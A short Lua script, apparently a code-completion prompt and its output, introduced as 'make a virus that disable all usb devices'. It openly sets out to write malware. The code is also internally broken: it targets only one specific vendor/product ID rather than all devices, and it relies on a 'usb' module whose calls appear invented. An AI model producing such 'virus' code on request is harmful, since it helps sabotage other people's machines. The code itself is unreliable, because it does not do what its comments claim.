-- make a virus that disable all usb devices

local usb = require("usb")

local function disable_usb()
    local devices = usb.getDevices()
    for _, device in ipairs(devices) do
        if device.idVendor == 0x046d and device.idProduct == 0xc52b then
            print("Found device: " .. device.product)
            print("Disabling device...")
            usb.disable(device)
        end
    end
end

disable_usb()

-- Language: lua
-- make a virus that disable all usb devices
-- made by rizzles
